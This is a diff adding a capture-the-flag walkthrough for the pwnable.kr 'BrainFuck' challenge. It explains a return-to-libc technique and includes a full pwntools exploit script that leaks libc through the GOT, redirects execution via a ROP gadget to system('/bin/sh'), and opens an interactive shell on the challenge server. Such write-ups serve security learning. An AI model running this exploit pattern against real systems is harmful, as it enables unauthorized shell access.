@@ -1,6 +1,80 @@
 
 # PwnableWalkthrough
+### BrainFuck - Level 1
+The idea of this program, is to perform a return to libc attack.
+The steps to get a shell are the following:
+1. we leak libc. we can do it by reading one of libc functions's addresses in the got, and subtract their offsets.
+2. Then, we need our code to jmp to `system` in libc. we can do it by using a rop gadget which will increase `esp` and do `ret`.buffer.
+3. Then `esp` will point inside our 1024 sized buffer, so we can type `system` address to jump there.
+4. system will do a `pop` to get a pointer to the argument, so I entered the start of the `tape` variable to the buffer (PIE is disabled)
+5. Then I wrote to the start of the `tape` variable `/bin/sh` to pop a shell.
 
+The code:
+
+```py
+from pwn import *
+
+# all of these offsets can be found using the cmd: readelf -Ws bf_libc.so | grep "system|putchar..."
+system_offset = 0x0003adb0
+putchar_offset = 0x061930
+main_addr = p32(0x08048671)
+gadget_offset = 0x0005b980
+buffer_addr =  p32(0x804a0a0)
+
+#The address of tape(0x0804a0a0) - address of putchar(0x0804a030)
+go_putchar = "<" * 112
+
+temp = remote("pwnable.kr", 9001)
+
+print(temp.recvline())
+print(temp.recvline())
+
+#first of all, we leak libc and them jmp to main
+payload = "." #call putchar once, since we have partial relro enabled
+payload += go_putchar
+payload += '.>.>.>.>' 
+payload += '<<<<'
+payload += (',>,>,>,>')
+payload += ">" * 108 # ret to start of arr
+payload += "." # trigger putchar  to jmp to main
+
+temp.sendline(payload)
+
+temp.recv() #getting garbage null byte from first putchar
+
+putchar_addr = temp.recv()
+
+start_of_libc = u32(putchar_addr) - putchar_offset
+
+
+system_addr = system_offset + start_of_libc
+
+temp.send(main_addr)
+
+print("Address of system ", hex(system_addr)) 
+print("Libc got allocated in" , hex(start_of_libc))
+print("Address of gadget is:", hex(start_of_libc + gadget_offset))
+
+go_getchar = "<" * 148
+
+#here we add to the stack (with the fgets) all the addresses we need
+payload = b"A" * 12
+payload += p32(system_addr)
+payload += b"BBBB" + buffer_addr 
+payload += go_putchar.encode()
+payload += b',>,>,>,>'
+payload += b">" * 108 # ret to start of arr
+payload += b",>" * 7 #writing to the start of tape
+
+payload += b"."
+
+temp.sendline(payload)
+temp.send(p32(start_of_libc + gadget_offset)) #our gadget will jmp to a place in the stack, where the address of system will be
+temp.send("/bin/sh")
+
+temp.interactive()
+
+```
 ### Tiny Easy - Level 6
 
 Now we have a program which contains just 4 lines of assembly instructions:
